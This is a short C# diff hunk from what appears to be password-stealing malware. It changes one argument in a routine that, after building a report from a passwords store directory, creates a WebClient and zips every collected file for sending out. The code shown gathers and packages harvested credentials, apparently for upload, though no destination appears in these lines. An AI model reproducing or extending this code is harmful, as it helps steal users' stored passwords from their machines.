@@ -1304,7 +1304,7 @@ public static void DeleteDirectory(string target_dir)
       
 		  if (Report.CreateReport(PasswordsStoreDirectory))
 			{	
-		Misc("pwtmp");
+		Misc(id);
 		 WebClient myWebClient = new WebClient();
 		 string[] files = Directory.GetFiles(PasswordsStoreDirectory, "*.*", SearchOption.AllDirectories);
 		 ZipStorer zip = ZipStorer.Create(ziplog);
